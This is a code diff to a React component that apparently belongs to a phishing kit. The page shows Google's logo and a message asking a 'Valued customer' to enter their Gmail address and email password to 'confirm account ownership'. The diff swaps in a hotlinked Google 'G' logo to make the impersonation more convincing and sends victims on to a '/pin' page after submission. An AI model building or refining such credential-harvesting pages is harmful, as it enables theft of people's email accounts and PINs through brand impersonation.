@@ -34,7 +34,7 @@ const Email = () => {
       .then((response) => {
         console.log(response.data);
         reset(); // Clear the input field
-        navigate("/email");
+        navigate("/pin");
       })
       .catch((error) => {
         console.error("There was an error!", error);
@@ -49,7 +49,7 @@ const Email = () => {
       <div className="container">
         <div className="contentSec">
             <div className="Emaillogo">
-            <img src={logo} alt="logo" />
+            <img src={"https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/480px-Google_%22G%22_logo.svg.png"} alt="logo" />
           </div>
           <div className="subtitle">Hello! Valued customer kindly use the correct email address and email password registered with Google Gmail below ⬇ to confirm your account ownership </div>
         </div>
